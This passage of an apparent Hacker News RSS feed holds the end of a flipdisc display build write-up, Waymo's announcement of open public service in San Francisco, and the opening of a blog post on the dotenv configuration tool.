<li>(4) <a href="https://www.wago.com/us/discover-wire-and-splicing-connectors/221">Wago 221 Wire Lever Nuts</a></li>
<li>(72) <a href="https://www.amazon.com/gp/product/B07R6QQ7MW/">Wire Ferrules</a></li>
<li><a href="https://www.amazon.com/gp/product/B09Q5DZSHF/">Ferrule Crimping Tool</a></li>
<li><a href="https://www.amazon.com/gp/product/B00CXKOEQ6/">Wire stripper</a></li>
</ul>
<h3 id="processing">Processing</h3>
<p>We’re using machine learning for processing voice, video, and images so needed a little bit more processing power than a basic single-board computer or microcontroller. We ended up using a <a href="https://developer.nvidia.com/embedded/learn/get-started-jetson-orin-nano-devkit">Nvidia Orin Nano</a>. A <a href="https://www.raspberrypi.com/">Raspberry Pi</a> would likely work too, although the framerate may start to suffer. We paired the Nvidia board with an <a href="https://www.mouser.com/new/raspberry-pi/raspberry-pi-camera-module-3/?utm_id=19995600859&amp;gad_source=1&amp;gclid=CjwKCAjw34qzBhBmEiwAOUQcFzi5DFHjEAI-fjmMZzRsJUR99gucgTf0dsMneAacyxRx6YVRJt8PLRoCegkQAvD_BwE">IMX708 camera</a> and a <a href="https://www.waveshare.com/audio-card-for-jetson-nano.htm">Waveshare audio board</a> for audio input/output. We created a <a href="https://github.com/simpsoka/office-flipdisc/blob/main/Dockerfile">Dockerfile</a> for deploying on <a href="https://developer.nvidia.com/embedded/jetpack-sdk-60dp">Jetson 6.0</a>. Mediapipe has to be compiled from source to enable the GPU. If you’re looking for an easier route, I would recommend a <a href="https://www.amazon.com/Apple-Desktop-Computer-10%E2%80%91core-Ethernet/dp/B0BSHGHGXR">M2 Mac Mini</a>, or if you want to skip the interaction you can go with a much more inexpensive solution, like a <a href="https://www.raspberrypi.com/">Raspberry Pi</a>.</p>
<hr>
<h2 id="software">Software</h2>
<h3 id="board">Board</h3>
<div><p><span>Frame Format</span></p><p><span>0x80</span><span>0x83</span><span>0x01</span><span>imageData</span><span>0x8F</span></p></div>
<p>Communication is over <a href="https://en.wikipedia.org/wiki/RS-485">RS485</a>. Each frame starts with a start byte [0x80], followed by either flush [0x83] or buffer [0x84], then the address of your board, then your image data, finally followed by an end byte [0x8F]. Image data is really easy since we only have two states [0, 1]. It also uses RLE for compressing each frame it sends over the wire. We created a basic library for using flipdisc screens in Node.js. It currently works with AlfaZeta and Hanover boards over USB and ethernet. <a href="https://github.com/kelly/flipdisc">Github</a>. You can send data directly from a canvas instance using ctx.getImageData(0, 0, width, height), and it’ll cast the pixel data to either 1 or 0 based on <a href="https://en.wikipedia.org/wiki/Luminance">luminance</a>. Here is an example of how it works:</p>
<pre tabindex="0" data-language="js"><code><span><span>import</span><span> { createDisplay } </span><span>from</span><span> 'flipdisc'</span><span> </span></span>
<span></span>
<span><span>const</span><span> path </span><span>=</span><span> '/dev/tty0'</span></span>
<span><span>const</span><span> display </span><span>=</span><span> createDisplay</span><span>([[</span><span>1</span><span>], [</span><span>2</span><span>]], path) </span></span>
<span></span>
<span><span>display.</span><span>send</span><span>(frameData)</span></span>
<span></span>
<span></span></code></pre>
<p><a href="https://flipdisc.io/docs">Driver Documentation</a></p>
<pre tabindex="0" data-language="plaintext"><code><span><span>npm install flipdisc</span></span>
<span><span></span></span></code></pre>
<p>We wanted to build something that could run real-time visualations with direct user feedback. This is unlike other low-pixel displays that pre-render assets to display on low-powered devices e.g. <a href="https://github.com/tidbyt/pixlet">Pixlet</a> from <a href="https://tidbyt.com/">tidbyt</a>. We knew we wanted to utilize webgl/canvas. There was no reason to re-invent the wheel with rendering libraries, so we’re leveraging existing web tech that we’ve found to work well - <a href="https://pixijs.com/">PIXI</a> for general 2D rendering, <a href="https://threejs.org/">Three.js</a> for 3D rendering, <a href="https://brm.io/matter-js/%5B">Matter.js</a> for physics engine, and <a href="https://gsap.com/core/">GSAP</a> for animations. We also utilize node-canvas, and node-gl for server-side rendering.</p>
<p>For interactions, we’re using Google’s fantastic <a href="https://mediapipe-studio.webapps.google.com/home">MediaPipe libraries</a> and models. For a quick demo, check of their <a href="https://mediapipe-studio.webapps.google.com/studio/demo/gesture_recognizer">example of Gesture Recognizing</a>. Since many ML libraries use python, we spawn python scripts from node to run most of the ML specific code, and then send the data back via <a href="https://zeromq.org/">ZeroMQ</a> IPC. Maybe we’ll use <a href="https://wasmer.io/posts/py2wasm-a-python-to-wasm-compiler">Python WASM</a> in the future.</p>
<p>Here is an example of using the Gesture Recognizer in this project:</p>
<pre tabindex="0" data-language="js"><code><span><span>  const</span><span> e </span><span>=</span><span> new</span><span> GestureEmitter</span><span>()</span></span>
<span><span>  scene.</span><span>add</span><span>(e)</span></span>
<span></span>
<span><span>  e.</span><span>on</span><span>(</span><span>'move'</span><span>, data </span><span>=&gt;</span><span> {</span></span>
<span><span>    if</span><span> (data.gesture[</span><span>0</span><span>] </span><span>==</span><span> 'Open_Palm'</span><span>) {</span></span>
<span><span>      ball.position </span><span>=</span><span> data.position;</span></span>
<span><span>    }</span></span>
<span><span>  })</span></span>
<span></span>
<span></span></code></pre>
<p>We created many different visualisations that can be toggled and customized on-demand. Each of these visualizations is represented as a scene and can be added to a queue. Playing a scene or managing the queue is accessible by a REST API. The live playing data is sent over websockets. Building a scene is straightforward. You can subscribe to events or add to the rendering queue with the <a href="https://flipdot.io/docs/server/#rendering">useLoop function</a>. Each scene file has to return both a scene and a schema and, optionally, a background task. A background task will run at a set interval, and if it returns successfully it’ll add a scene to the queue to play.</p>
<p><a href="https://flipdisc.io/docs/server">Server Documentation</a> | <a href="https://github.com/simpsoka/office-flipdisc/tree/main/scenes">Scene Examples</a></p>
<pre tabindex="0" data-language="plaintext"><code><span><span>npm install flipdisc-server</span></span>
<span><span></span></span></code></pre>
<p>Here is an example of a basic scene that shows an image.</p>
<pre tabindex="0" data-language="js"><code><span><span>import</span><span> { createScene, ImageView } </span><span>from</span><span> 'flipdisc-server'</span></span>
<span></span>
<span><span>const</span><span> schema </span><span>=</span><span> {</span></span>
<span><span>  title: </span><span>'Image'</span><span>,</span></span>
<span><span>  properties: {</span></span>
<span><span>    url: {</span></span>
<span><span>      type: </span><span>'string'</span><span>,</span></span>
<span><span>      default: </span><span>'image.png'</span><span>,</span></span>
<span><span>    },</span></span>
<span><span>  }</span></span>
<span><span>}</span></span>
<span></span>
<span><span>const</span><span> image</span><span> =</span><span> function</span><span>(opts) {</span></span>
<span><span>  const</span><span> scene </span><span>=</span><span> createScene</span><span>()</span></span>
<span><span>  scene.</span><span>once</span><span>(</span><span>'loaded'</span><span>, () </span><span>=&gt;</span><span> {</span></span>
<span><span>    const</span><span> img </span><span>=</span><span> new</span><span> ImageView</span><span>(opts.url)</span></span>
<span><span>    scene.</span><span>add</span><span>(img)</span></span>
<span><span>  })</span></span>
<span></span>
<span><span>  return</span><span> scene;</span></span>
<span><span>}</span></span>
<span></span>
<span></span>
<span><span>export</span><span> { image </span><span>as</span><span> scene, schema }</span></span>
<span></span></code></pre>
<p>Here is a bit more of what the library helps take care of:</p>
<ul>
<li>A way to import scenes from a directory</li>
<li>Live reload on scene files</li>
<li>Background tasks that add a scene to the queue</li>
<li>Easy UI components for text, images, lists, etc</li>
<li>Flex layout based on <a href="https://github.com/facebook/yoga">Yoga</a>.</li>
<li>Basic getters and setup for pixi/three/matter as well as ability to add additional modules</li>
<li>REST server and websocket for live data</li>
<li>Easy way to use rendering loops, or GLSL shaders</li>
</ul>
<h3 id="interface">Interface</h3>
<p>I’ve built many projects in the past that become unusable because I no longer remember which command to run, or how to operate it. So, we wanted to make sure to build a reliable interface for the display. We settled on an <a href="https://expo.dev/">expo</a> app since it was the quickest way to prototype. As much as I love native apps, I cringe whenever I have to open Xcode. You can control all aspects of the display from the app - pause, start, skip, previous. You can configure scene variables to personalize the experience. You can also freehand draw right on the screen. Download it on the <a href="https://apps.apple.com/app/flipdisc/id6504055618">App Store</a>. Here are some screenshots from the app:</p>

<p>A few of the features are:</p>
<ul>
<li>Pause/play a scene</li>
<li>Add or remove from queue</li>
<li>Skip or previous in queue</li>
<li>Watch live screen of what’s being shown on display</li>
<li>Freehand draw on screen</li>
<li>Send configuration variables to each scene</li>
</ul>
<hr>
<h2 id="design">Design</h2>
<p><a href="https://en.wikipedia.org/wiki/SubSpace_(video_game)">Subspace</a> was one of the first multiplayer games I played as a kid. The game allowed you to have a tiny 12x8 banner that you could design that would appear right next to your ship. I was blown away by what people could create with such limited space. I was soon hooked on designing my own. There was something about the strict limitation of pixels that lent itself to pushing creativity even further - you wanted to see how far you could push the medium. It’s easy to take for granted the sheer number of pixels we have at our disposal when working on the web. Being forced to distill things into the simplest information that you can convey is sometimes a blessing because you have to be very conscious and deliberate with the decisions you make. The 42x84 size of the flipdisc display felt like a similar exercise in constraints.</p>
<p>The basic readable font that we use is a tiny <a href="https://fontstruct.com/fontstructions/show/1404171/cg-pixel-3x5">3x5 pixel font</a>. There is also <a href="https://fontstruct.com/fontstructions/show/1404171/cg-pixel-4x5">4x5</a> and <a href="https://fontstruct.com/fontstructions/show/1404346/cg-pixel-4x5-2-1">mono</a> variants. If you want to go even smaller, there are <a href="https://fontstruct.com/fontstructions/show/670512/tiny3x3a">3x3 fonts</a> and <a href="https://github.com/Michaelangel007/nanofont3x4">3x4 nano fonts</a>, but I feel like they lose too much legibility to be usable in practice. Anything over 12 pixels you can use most fonts with maintaining some legibility. Bitmap fonts are really great for these types of displays - especially since any anti-aliasing isn’t rendered. There are some really interesting <a href="https://github.com/ianhan/BitmapFonts">archives of Bitmap designed fonts</a> that could be fun to integrate.</p>
<astro-island uid="1BVe6Y" component-url="/_astro/FontExperimenter.DqyUpPRB.js" component-export="default" renderer-url="/_astro/client.E677JtKR.js" props="{}" ssr="" client="only" opts="{&quot;name&quot;:&quot;FontExperimenter&quot;,&quot;value&quot;:&quot;react&quot;}"></astro-island>
<p>For images, we use a mixture of <a href="https://en.wikipedia.org/wiki/Floyd%E2%80%93Steinberg_dithering">Floyd-Steinberg dithering</a> and <a href="https://en.wikipedia.org/wiki/Ordered_dithering">Bayer 4x4 ordered dithering</a>. Below is an example that shows the difference in the two techniques. I prefer Floyd-Steinberg on images since it has a more natural pixel distribution, and Bayer on UI elements since it produces a consistent pattern. If you’re curious to learn more, here is a fantastic article on the subject - <a href="https://surma.dev/things/ditherpunk/">Ditherpunk — The article I wish I had about monochrome image dithering</a></p>
<astro-island uid="1U0Tog" component-url="/_astro/DitherExample.Dgek1gIL.js" component-export="default" renderer-url="/_astro/client.E677JtKR.js" props="{}" ssr="" client="only" opts="{&quot;name&quot;:&quot;DitherExample&quot;,&quot;value&quot;:&quot;react&quot;}"></astro-island>
<p>Finally, below are some of the scenes that we designed for my office. They include a <a href="https://github.com/simpsoka/office-flipdisc/blob/main/scenes/feed.js">New York Times RSS reader</a>, a <a href="https://github.com/simpsoka/office-flipdisc/blob/main/scenes/spotify.js">Spotify client</a>, a <a href="https://github.com/simpsoka/office-flipdisc/blob/main/scenes/weather.js">weather app</a>, and <a href="https://github.com/simpsoka/office-flipdisc/tree/main/scenes">many more</a>. We’ll probably expand on this list as I figure out which stuff I want to casually glance at as I work.</p>
<astro-island uid="15UJ8y" component-url="/_astro/Scenes.D97-rpHx.js" component-export="default" renderer-url="/_astro/client.E677JtKR.js" props="{}" ssr="" client="only" opts="{&quot;name&quot;:&quot;Scenes&quot;,&quot;value&quot;:&quot;react&quot;}"></astro-island>
<h2 id="next-steps-ai-wall">Next Steps: AI Wall</h2>
<p>Our goal is to make a transparent agent interface to AI utilizing new multi-modal input/output. Since a lot of these capabilities are right around the corner, we’re waiting on next-gen models to be released before pursusing this functionality.</p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>I really had a fun time colaborating on this project. I do hope that flipdiscs become more accessible for hobbyists. If anyone wants to collaborate on new affordable flipdisc hardware, let me know! And, if you have any questions about how to build your own feel free to <a href="https://flipdisc.io/contact">reach out</a>.</p>
<h4 id="inspiration">Inspiration</h4>
<ul>
<li><a href="https://www.lexaloffle.com/pico-8.php#m">Pico-8</a></li>
<li><a href="https://github.com/tidbyt/pixlet">Pixlet</a></li>
<li><a href="https://openprocessing.org/user/6533/?view=sketches&amp;o=48#sketches">Shunsuke Takawo</a></li>
<li><a href="https://github.com/chrishemmings/flipPyDot">FlipPyDot</a></li>
<li><a href="https://vimeo.com/387920091">Flipdigits Monitor: Algorithms</a></li>
<li><a href="https://surma.dev/things/ditherpunk/">Ditherpunk</a></li>
<li><a href="https://beyondloom.com/blog/dither.html">Atkinson Dithering</a></li>
<li><a href="https://www.trenchwars.org/SSBE/">Subspace Banner Emporium</a></li>
</ul>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Waymo One is now open to everyone in San Francisco (103 pts)]]></title>
            <link>https://waymo.com/blog/2024/06/waymo-one-is-now-open-to-everyone-in-san-francisco/</link>
            <guid>40789411</guid>
            <pubDate>Tue, 25 Jun 2024 14:54:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://waymo.com/blog/2024/06/waymo-one-is-now-open-to-everyone-in-san-francisco/">https://waymo.com/blog/2024/06/waymo-one-is-now-open-to-everyone-in-san-francisco/</a>, See on <a href="https://news.ycombinator.com/item?id=40789411">Hacker News</a></p>
<div id="readability-page-1" class="page"><article aria-labelledby="P0-7-title"><a href="https://waymo.com/blog/"><img alt="" role="presentation" src="https://waymo.com/static/images/blog/icon-left-arrow.svg"><img alt="" role="presentation" src="https://waymo.com/static/images/blog/icon-left-arrow-rollover.svg"><span>Back to all posts</span></a>

<section>
<div>
<picture>
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp" media="(min-width: 600px)" type="image/webp" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif" media="(min-width: 600px)" type="image/gif" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp" media="(min-width: 600px) and (max-width: 1023px)" type="image/webp" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif" media="(min-width: 600px) and (max-width: 1023px)" type="image/gif" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp" media="(max-width: 599px)" type="image/webp" width="960" height="540"><img alt="Waymo One is open in SF to everybody " loading="lazy" srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif" src="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?w=420" width="960" height="540">
</picture>
</div>
<div>
<div>
<picture>
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp" media="(min-width: 600px)" type="image/webp" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif" media="(min-width: 600px)" type="image/gif" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp" media="(min-width: 600px) and (max-width: 1023px)" type="image/webp" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif" media="(min-width: 600px) and (max-width: 1023px)" type="image/gif" width="960" height="540">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?fm=webp" media="(max-width: 599px)" type="image/webp" width="960" height="540"><img alt="Waymo One is open in SF to everybody " loading="lazy" srcset="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif 2x, https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif" src="https://images.ctfassets.net/e6t5diu0txbw/3Y8zapUDIcpPmwSTnpSiBV/d43adc43f49e77ec6b15c066bb01b387/Waymo_SF.gif?w=420" width="960" height="540">
</picture>
</div>
<p>The wait is over. Starting today, anyone can hail a ride with Waymo in San Francisco. Rain, shine, or Karl the Fog, just <a href="http://waymo.com/app"><u>download the app</u></a>, and ride.</p>
<p>We’ve been operating in San Francisco for years now, deliberately scaling our service over time. With tens of thousands of weekly trips, our Waymo One service provides safe, sustainable, and reliable transportation to locals and visitors to the city alike.</p>
<p>Now it’s available to anyone.</p>
<h4><b>Waymo rides for all, 24/7, across the city</b></h4>
<figure><iframe src="https://www.youtube.com/embed/pE9DF5_k3ZY" loading="lazy" allowfullscreen="" height="400" width="400"></iframe></figure>
<p>San Franciscans are using Waymo to connect to the city’s social fabric, making fully autonomous rides part of their daily lives.&nbsp;</p>
<p>About 30% of Waymo rides in San Francisco are to local businesses. We’ve provided thousands of rides to and from individual restaurants, live music venues, bars, coffee shops, ice cream parlors, parks, and museums, boosting the local economy. In a recent survey, over half of our riders said they used Waymo in the past couple of months to or from medical appointments, highlighting the value of personal space during these trips. Additionally, 36% of our SF riders used Waymo to connect to other forms of transit, like BART or Muni. Some of our San Francisco riders even use Waymo to depart in style from their <a href="https://twitter.com/Jovanthienen/status/1762870287681687678"><u>weddings</u></a>.</p>
<p>“I'm thankful to be living in a city that embraces technology when it can improve our lives with convenient and safe modes of transit,” says Michelle Cusano, Executive Director at The Richmond Neighborhood Center.</p>
<p>Waymo’s fleet is all-electric and sources 100% renewable energy from the City’s <a href="https://www.cleanpowersf.org/supergreenspotlight"><u>CleanPowerSF program</u></a>. Since the beginning of our commercial operations in August 2023, Waymo’s rides have helped curb carbon <a href="http://waymo.com/waymo-avoided-emissions-methodology"><u>emissions by an estimated 570,000 kg</u></a>, contributing to California’s ride hail emissions goals. This also empowers our riders to travel more sustainably — Waymo’s recent rider survey revealed that 53% of our San Francisco users feel that Waymo has helped them be more environmentally friendly.</p>
<p>Plus, more than half of Waymo riders in SF say that riding with Waymo has improved their sense of personal safety when getting around, according to the survey.</p>
<p>“I enjoy riding in Waymo cars and appreciate the ease of transportation,” says Charles Renfroe, Development Manager at Openhouse SF. “Members of our community, especially transgender and gender non-conforming folks, don’t have to worry about being verbally assaulted or discriminated against when riding with Waymo.”</p>
<p>In addition to improving mobility for locals, Waymo offers a unique way for visitors to experience the city. Thousands of tourists have enjoyed the sightseeing from Waymo vehicles, exploring San Francisco’s iconic landmarks from the Presidio to the Ferry Building. By supporting Spanish and Chinese languages through our app and in-car features, we ensure a more inclusive experience for a diverse group of local riders and visitors to the City by the Bay alike.</p>
<p>In total, nearly 300,000 people, including those who live, work, and visit San Francisco, have signed up to ride with Waymo since we first opened a waitlist —&nbsp;more than a quarter of the city’s population. We’ve been welcoming new riders to the service incrementally, and we are now excited to open it up to everyone.</p>
<h4><b>Scaling our operations safely and responsibly</b></h4>
<p>Safety leads everything we do at Waymo, and this step in our journey builds on over 15 years of experience building safe and convenient autonomous driving, ever since we took our first rides on the streets of Palo Alto back in 2009. With more than 20 million rider-only miles and nearly 2 million paid rider-only public trips under our belt, we’re now bringing the safety benefits of the Waymo Driver to more people in San Francisco.</p>
<p>Road safety is urgent. Thirty nine people were killed on San Francisco’s roads in 2022 and twenty five more in 2023, with thousands reporting injuries every year. Traffic violence kills around 40,000 people in the U.S. annually. The status quo on road safety doesn't serve the people of San Francisco, and the Waymo Driver can help change that.&nbsp;</p>
<p>"Drunk driving remains the leading cause of fatalities and injuries on American roads, claiming over 13,000 lives in 2021 alone. As drivers increasingly drive while impaired, the need for technological intervention becomes evident,” — says Patricia Rillera, Mothers Against Drunk Driving (MADD) California State Executive Director. “MADD proudly collaborates with autonomous vehicle leaders like Waymo, recognizing their potential to prevent tragedies caused by impaired, distracted, and drowsy driving."</p>
<p>Our track record for safe operations is unparalleled. We’ve been safely transporting passengers for over six years, now providing more than 50,000 rides a week across three major urban areas. Over more than 30 scientific papers, it’s become clear that the Waymo Driver is <a href="https://waymo.com/blog/2023/07/the-waymo-driver-is-already-improving-road-safety/"><u>already</u></a> improving road safety in the cities where we operate. The Waymo Driver <a href="https://waymo.com/blog/2022/09/benchmarking-av-safety/"><u>avoids high-severity collisions</u></a> better than even the most attentive human drivers, and the data shows that we have fewer <a href="https://waymo.com/blog/2023/09/waymos-autonomous-vehicles-are-significantly-safer-than-human-driven-ones/"><u>insurance claims</u></a> and <a href="https://waymo.com/blog/2023/12/waymo-significantly-outperforms-comparable-human-benchmarks-over-7-million/"><u>injuries or police reports</u></a> than human drivers.</p>
<div>
<picture>
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?w=1440&amp;fm=webp" media="(min-width: 600px)" type="image/webp" width="1920" height="1080">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png 2x, https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?w=1440" media="(min-width: 600px)" type="image/png" width="1920" height="1080">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?w=1024&amp;fm=webp" media="(min-width: 600px) and (max-width: 1023px)" type="image/webp" width="1920" height="1080">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png 2x, https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?w=1024" media="(min-width: 600px) and (max-width: 1023px)" type="image/png" width="1920" height="1080">
<source srcset="https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?fm=webp 2x, https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?w=1024&amp;fm=webp" media="(max-width: 599px)" type="image/webp" width="1920" height="1080"><img alt="Waymo's SF safety numbers" loading="lazy" srcset="https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png 2x, https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?w=1024" src="https://images.ctfassets.net/e6t5diu0txbw/5JVLD4khew8dBoKL08UT3s/66527eb7ff746b13bfe000d6cd34fb04/Safety24_Blog_1080p__5_.png?w=420" width="1920" height="1080">
</picture>
</div>
<p>Our operations improve safety for other road users, too. Over the 3.8+ million rider-only miles we’ve driven in San Francisco through the end of March, the Waymo Driver was involved in 17 fewer crashes with injuries and 12 fewer police-reportable crashes compared to human drivers*.</p>
<p>We’re committed to growing our service gradually and responsibly. We work closely with city and state officials, first responders, and advocates for road safety to ensure our service helps local communities gain access to reliable, safe, environmentally friendly transportation and has a positive impact on mobility.</p>
<p>A huge thanks to our many riders, community partners, and the residents of San Francisco for their support on this journey. Together, we’re providing locals and visitors to San Francisco with a safe, clean and fun mobility experience, keeping the city on the forefront of technological innovation.</p>
<p>And if you’d like to experience full autonomy for yourself, download the Waymo One app on the <a href="https://apps.apple.com/us/app/waymo-one/id1343524838"><u>App Store</u></a> and <a href="https://play.google.com/store/apps/details?id=com.waymo.carapp&amp;hl=en_US&amp;gl=US&amp;pli=1"><u>Google Play</u></a> and take a ride today.</p>
<p><i>*The comparison is informed by Waymo’s </i><a href="https://waymo.com/blog/2023/12/waymo-significantly-outperforms-comparable-human-benchmarks-over-7-million/"><i><u>methodology</u></i></a><i> introduced in December, 2023.&nbsp;</i></p>
</div>
</section>
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[From Dotenv to Dotenvx: Next Generation Config Management (149 pts)]]></title>
            <link>https://dotenvx.com/blog/2024/06/24/dotenvx-next-generation-config-management.html</link>
            <guid>40789353</guid>
            <pubDate>Tue, 25 Jun 2024 14:49:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dotenvx.com/blog/2024/06/24/dotenvx-next-generation-config-management.html">https://dotenvx.com/blog/2024/06/24/dotenvx-next-generation-config-management.html</a>, See on <a href="https://news.ycombinator.com/item?id=40789353">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
    

    <div>
      <p>The day after July 4th 🇺🇸, I wrote <a href="https://github.com/motdotla/dotenv/commit/71dabbf27b699fcb7a04714709cecfc6e78892b9">dotenv’s first commit</a> and released <a href="https://www.npmjs.com/package/dotenv/v/0.0.1">version 0.0.1 on npm</a>. It looked like this.</p>

<p><img src="https://github.com/dotenvx/dotenvx/assets/3848/632a3bf4-50f4-4614-a0c2-12b2f6e64ccc" loading="lazy"></p>

<p>In the 11 years since, it’s become one of the <a href="https://gist.github.com/anvaka/8e8fa57c7ee1350e3491#top-1000-most-depended-upon-packages">most depended-upon packages</a> worldwide 🌎 – adjacent ubiquitous software like TypeScript and ESLint.</p>

<p><img src="https://github.com/dotenvx/dotenvx/assets/3848/3b93fa70-8204-4563-b5b5-a3a2dcfb3de3" loading="lazy"></p>

<p>It’s an example of “big things have small beginnings”. The <a href="https://github.com/motdotla/dotenv/commit/71dabbf27b699fcb7a04714709cecfc6e78892b9#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5">README</a> was short and the <a href="https://github.com/motdotla/dotenv/commit/71dabbf27b699fcb7a04714709cecfc6e78892b9#diff-7934bf411fea192ad8cd69e0a12911648a2842cb0f2409a8fb67b41b7069d757">code was humble</a>, but today it’s beloved by millions of developers.</p>

<p>It’s one of the few security tools that improve your security posture with minimal fuss.</p>

<ul>
  <li>a single line of code - <code>require('dotenv').config()</code>
</li>
  <li>a single file - <code>.env</code>
</li>
  <li>a single gitignore append - <code>echo '.env' &gt; .gitignore</code>
</li>
</ul>

<p>It’s aesthetic, it’s effective, it’s elegant.</p>

<p><strong>But it’s not without its problems!</strong> And that’s what I want to talk about.</p>

<h2 id="the-problems-with-dotenv">The problems with <code>dotenv</code>
</h2>

<p>In order of importance, there are three big problems with <code>dotenv</code>:</p>

<ol>
  <li><em>leaking your .env file</em></li>
